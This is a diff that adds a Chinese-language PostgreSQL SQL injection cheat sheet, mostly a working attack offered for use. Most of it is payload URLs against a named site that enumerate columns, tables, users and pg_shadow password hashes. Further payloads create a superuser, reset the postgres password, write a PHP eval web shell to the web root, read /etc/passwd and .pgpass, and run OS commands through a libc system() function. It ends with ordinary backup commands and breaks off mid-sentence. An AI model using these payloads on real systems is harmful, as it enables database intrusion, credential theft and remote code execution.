@@ -1,0 +1,140 @@
+5432端口
+
+/*order by猜字段数*/
+http://qqhack8.blog.163.com/detail.php?id=236+order+by+26--
+
+/*判断postgresql数据库*/
+http://qqhack8.blog.163.com/detail.php?id=236+and+1::int=1--
+
+/*通过cast类型转换来暴postgresql信息*/
+http://qqhack8.blog.163.com/detail.php?id=236+and+1=cast(version() as int)--
+
+/*全部用null填充 方便在测试类型*/
+http://qqhack8.blog.163.com/detail.php?id=236+and+1=2+union+select+null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+/*测试类型*/
+http://qqhack8.blog.163.com/detail.php?id=236+and+1=2+union+select+1,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,20,null,null,null,null,null,null--
+
+/*当前PostgreSQL版本*/
+http://qqhack8.blog.163.com/detail.php?id=236+and+1=2+union+select+1,null,version(),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,20,null,null,null,null,null,null--
+
+/*当前用户*/
+http://qqhack8.blog.163.com/detail.php?id=236+and+1=2+union+select+1,null,user,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,20,null,null,null,null,null,null--
+
+/*当前用户权限*/
+http://qqhack8.blog.163.com/detail.php?id=236+and+1=2+union+select+1,null,current_schema(),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,20,null,null,null,null,null,null--
+
+/*当前数据库名字*/
+http://qqhack8.blog.163.com/detail.php?id=236+and+1=2+union+select+1,null,current_database(),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,20,null,null,null,null,null,null--
+或
+http://qqhack8.blog.163.com/detail.php?id=236+and+1=2+union+select+1,null,datname,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,20,null,null,null,null,null,null+from+pg_database+limit+1+offset+0--
+
+/*会话用户*/
+http://qqhack8.blog.163.com/detail.php?id=236+and+1=2+union+select+1,null,csession_user,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,20,null,null,null,null,null,null--
+
+/*目前执行环境下的用户名*/
+http://qqhack8.blog.163.com/detail.php?id=236+and+1=2+union+select+1,null,current_user,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,20,null,null,null,null,null,null--
+或
+http://qqhack8.blog.163.com/detail.php?id=236+and+1=cast(current_user ||999 as int)--
+
+/*得到所有用户表,修改offset后面的*/
+http://qqhack8.blog.163.com/detail.php?id=236+and+1=2+union+select+1,null,relname,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,20,null,null,null,null,null,null+from+pg_stat_user_tables+limit+1+offset+0--
+或(加入relkind=’r’,只查询普通表)
+http://qqhack8.blog.163.com/detail.php?id=236+and+1=2+union+select+1,null,relname,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,20,null,null,null,null,null,null+from+pg_class+where+relkind='r'+limit+1+offset+0--
+
+/*得到表名为xxx的oid值*/
+http://qqhack8.blog.163.com/detail.php?id=236+and+1=2+union+select+1,null,oid,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,20,null,null,null,null,null,null+from+pg_class+where+relname='表名'+limit+1+offset+0--
+或(由于oid类型是oid,要数据类型兼容我们用cast函数强制转换成varchar类型)
+http://qqhack8.blog.163.com/detail.php?id=236+and+1=2+union+select+1,null,cast(oid+as+varchar(10)),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,20,null,null,null,null,null,null+from+pg_class+where+relname='表名'+limit+1+offset+0--
+
+/*读取每个表名的字段.(需要在information_schema模式没有删除的情况下)*/
+http://qqhack8.blog.163.com/detail.php?id=236+and+1=2+union+select+1,null,column_name,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,20,null,null,null,null,null,null+from+information_schema.columns+where+table_name='表名'+limit+1+offset+0--
+或(利用对应表名为xxx的oid值)
+http://qqhack8.blog.163.com/detail.php?id=236+and+1=2+union+select+1,null,attname,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,20,null,null,null,null,null,null+from+pg_attribute+where+attrelid=oid值+limit+1+offset+0–
+
+/*数据库用户的信息pg_shadow*/
+pg_shadow 关键字段username、passwd和usesuper(超级用户的意思),不过此表被做了权限设置
+http://qqhack8.blog.163.com/detail.php?id=236+and+1=2+union+select+1,null,usename||chr(124)||passwd,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,20,null,null,null,null,null,null+from+pg_shadow+limit+1+offset+0--
+
+/*如果账户是postgres*/
+新建一个用户为pg5yl8密码为pg5yl8
+;create+user+pg5yl8+with+superuser+password+'pg5yl8'--
+ps：这是新建系统账户pg5yl8，如果有3389就可以直接用户pg5yl8密码pg5yl8登陆
+修改postgres的用户密码为pg5yl8
+;alter+user+postgres+with+password+'pg5yl8'--
+ps：这是修改系统账户postgres的密码，如果有3389就可以直接用户postgres密码pg5yl8登陆
+
+
+/*遍历PG当前数据库中的全部表*/
+select+tablename+from+pg_tables+where+tablename+not+like+'pg%'+and+tablename+not+like+'sql_%'+order+by+tablename--
+
+
+/*如何获得webshell*/
+http://127.0.0.1/postgresql.php?id=1;create table pg5yl8_shell(shell text not null);
+http://127.0.0.1/postgresql.php?id=1;insert into shell ('<?php eval($_POST[r]);?>');
+http://127.0.0.1/postgresql.php?id=1;copy pg5yl8_shell(shell) to '/var/www/html/pg5yl8.php';
+另一种简便的方法：
+copy (select '<?php eval($_POST[r]);?>') to '/var/www/html/pg5yl8.php'
+
+/*如何读文件*/
+http://127.0.0.1/postgresql.php?id=1;create table pg5yl8_file(file text not null);
+http://127.0.0.1/postgresql.php?id=1;copy pg5yl8_file(file) from '/etc/passwd';
+http://127.0.0.1/postgresql.php?id=1;select * from pg5yl8_file;
+读取文件前20行
+pg_read_file('/etc/passwd',1,20)
+
+/*pgadmin的帐户信息*/
+在linux下默认存放在用户家目录的.pgpass 文件中
+cat .pgpass
+
+/*从PostgreSQL 8.2后加入了*/
+pg_file_write(filename,text,bool)   bool为覆盖模式
+pg_read_file(filename,pos,length) 返回类型text不提，很好利用，不管是cast暴值还是union
+pg_ls_dir(dirname)
+注意他的返回类型为setof text 需要这样来(select pg_ls_dir('/var/www/') limit 1 offset n)这样来读取不同记录
+pg_stat_file(filename)   这个返回结果是record，为文件属性，需要把他作为一个子表来看待。不太清楚具体的返回字段。有兴趣的同学自己看看。另外像pg_file_unlink,pg_file_raname不提
+
+/*单引号的绕过*/
+单引号的绕过在pg8.0以上容易实现。这部分来源于老外的文档。大致意思可以用$quote$代替单引号，也可以用$$来定义字符。比如'test'变成$quote$test$quote$或$$test$$。这样对php的注入就大为方便了
+
+版本大于8
+创建一个system的函数：
+create FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT
+创建一个输出表：
+create table stdout(id serial, system_out text)
+执行shell，输出到输出表内：
+select system('uname -a > /tmp/test')
+copy 输出的内容到表里面；
+COPY stdout(system_out) FROM '/tmp/test'
+从输出表内读取执行后的回显，判断是否执行成功
+union all select NULL,(select stdout from system_out order by id desc),NULL limit 1 offset 1–-
+
+
+备份数据命令:pg_dump -O -h localhost -U 用户名 数据库名 > 备份文件名
+还原数据命令: psql -h localhost -U 用户名 -d 数据库名 < 备份的文件名
+具体步骤：
+1 本机上通过远程桌面访问到168.192.0.5(开始—运行 输入“\\168.192.0.5”)
+2 比方说我们要把postgresql里的mdb数据库备份下 那么在上一步进入的命令行状态下 输入
+“pg_dump -O -h 168.192.0.5 -U postgres mdb >c:\mdb.sql”
+注意：此语句里的“-o”必需是大写字母 否则不能识别
+pg_dump -O -h 192.168.0.5 -U dbowner -w -p 5432 SS >SS.sql 这个是备份数据库
+以上是把在服务器端的mdb数据库备份到本地c盘下面 这是会看到本机c盘下面有一个名称为mdb 的sql文件 这个文件就是服务器端postgresql里的mdb数据库里的数据表文件
+这样就实现了数据的备份功能了
+3 我们再把这个数据库导入到postgressql里面去 因为很多时候我们可能误操作删除了数据库 这时候数据的还原就显得很有必要了
+这一步也是一个命令行就可以搞定的了 输入“psql -h localhost -U postgres -d mdb 这样就把以前备份过的数据库还原到了本机上的数据库里了
+
+
+/*会话信息函数*/
+current_database()当前数据库的名字
+current_schema()当前模式的名字
+current_schemas(boolean)在搜索路径中的模式名字
+current_user目前执行环境下的用户名
+inet_client_addr()连接的远端址
+inet_client_port()连接的远端端口
+inet_server_addr()连接的本地地址
+inet_server_port()连接的本地端口
+session_user会话用户名
+pg_postmaster_start_time()postmaster 启动的时间
+user等于current_user
+version()PostgreSQL 版本信息
+session_user 通常是初始化当前数据库联接的用户， 不过超级用户可以用 SET SESSION AUTHORIZATION 修改这个设置。 current_user 是用于权限检查的用户标识。通常， 它总是等于会话用户，但是在将来可能有 "setuid" 函数和其他它是等于会话用户， 但是它在函数执行的过程中随着属性 SECURITY DEFINER 的改变而改变。 在 Unix 的说法里，那么会话用户是 " 真实用户 " ，而当前
